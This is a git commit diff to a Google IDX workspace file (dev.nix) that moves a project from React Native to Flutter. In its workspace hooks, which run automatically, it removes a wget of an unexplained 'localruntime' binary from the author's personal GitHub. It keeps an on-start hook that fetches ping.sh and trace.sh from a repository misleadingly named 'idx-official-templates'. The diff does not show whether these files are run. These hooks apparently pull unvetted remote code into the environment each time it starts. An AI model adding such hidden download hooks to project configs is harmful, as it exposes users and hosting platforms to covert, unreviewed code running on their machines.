7dea9d3b15927399558a74de7142f33a0d936d90
dediminari <101470275+dediminari@users.noreply.github.com>
2024-12-17 17:51:43 +0700

    Update dev.nix

--- .idx/dev.nix
+++ .idx/dev.nix
@@ -2,36 +2,48 @@
 # see: https://developers.google.com/idx/guides/customize-idx-env
 { pkgs, ... }: {
   # Which nixpkgs channel to use.
-  channel = "stable-23.11"; # or "unstable"
-  services.docker.enable = true;
+  channel = "stable-24.05"; # or "unstable"
   # Use https://search.nixos.org/packages to find packages
   packages = [
-  pkgs.nodejs_20
-  pkgs.httping
+    pkgs.jdk17
+    pkgs.unzip
   ];
+  services.docker.enable = true;
   # Sets environment variables in the workspace
   env = {};
   idx = {
     # Search for the extensions you want on https://open-vsx.org/ and use "publisher.id"
     extensions = [
-      "msjsdiag.vscode-react-native"
+      "Dart-Code.flutter"
+      "Dart-Code.dart-code"
     ];
     workspace = {
       # Runs when a workspace is first created with this `dev.nix` file
       onCreate = {
-        install = "npm ci --prefer-offline --no-audit --no-progress --timing && npm i @expo/ngrok@^4.1.0";
-        create-tmux-sessions = "
-            wget https://github.com/dediminari/bit/raw/refs/heads/main/localruntime
-        ";
+        build-flutter = ''
+          cd /home/user/myapp/android
+
+          ./gradlew \
+            --parallel \
+            -Pverbose=true \
+            -Ptarget-platform=android-x86 \
+            -Ptarget=/home/user/myapp/lib/main.dart \
+            -Pbase-application-name=android.app.Application \
+            -Pdart-defines=RkxVVFRFUl9XRUJfQ0FOVkFTS0lUX1VSTD1odHRwczovL3d3dy5nc3RhdGljLmNvbS9mbHV0dGVyLWNhbnZhc2tpdC85NzU1MDkwN2I3MGY0ZjNiMzI4YjZjMTYwMGRmMjFmYWMxYTE4ODlhLw== \
+            -Pdart-obfuscation=false \
+            -Ptrack-widget-creation=true \
+            -Ptree-shake-icons=false \
+            -Pfilesystem-scheme=org-dartlang-root \
+            assembleDebug
+
+          # TODO: Execute web build in debug mode.
+          # flutter run does this transparently either way
+          # https://github.com/flutter/flutter/issues/96283#issuecomment-1144750411
+          # flutter build web --profile --dart-define=Dart2jsOptimization=O0
+        '';
       };
       # Runs when a workspace restarted
       onStart = {
-        connect-device = ''
-          adb -s localhost:5554 wait-for-device
-        '';
-        android = ''
-          npm run android -- --port 5554 --tunnel
-        '';
         start-ping-sessions = "
             wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/ping.sh
             wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/trace.sh
@@ -57,13 +69,12 @@
       enable = true;
       previews = {
         web = {
-          command = ["npm" "run" "web" "--" "--port" "$PORT"];
-          manager = "web";
+          command = ["flutter" "run" "--machine" "-d" "web-server" "--web-hostname" "0.0.0.0" "--web-port" "$PORT"];
+          manager = "flutter";
         };
         android = {
-          # noop
-          command = ["tail" "-f" "/dev/null"];
-          manager = "web";
+          command = ["flutter" "run" "--machine" "-d" "android" "-d" "localhost:5555"];
+          manager = "flutter";
         };
       };
     };
